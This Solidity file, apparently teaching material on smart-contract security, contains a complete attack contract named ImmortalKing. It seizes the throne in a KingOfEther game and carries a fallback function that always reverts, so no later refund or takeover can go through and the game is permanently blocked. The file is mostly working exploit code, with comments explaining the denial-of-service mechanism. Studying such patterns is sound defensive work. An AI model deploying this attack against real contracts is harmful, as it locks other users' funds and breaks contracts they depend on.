pragma solidity 0.5.10;

/**
 * Because sending ether to a contract invokes the fallback function,
 * having it throw an error will halt the execution of KingOfEther
 */
contract ImmortalKing {
    KingOfEther private koe;
    
    constructor(address payable _address) public {
        koe = KingOfEther(_address);
    }
    
    /**
     * Fallback function that always fails
     */
    function () external payable {require(false);}
    
    function takeOver() public payable {
        koe.takeOver.value(msg.value)();
    }
}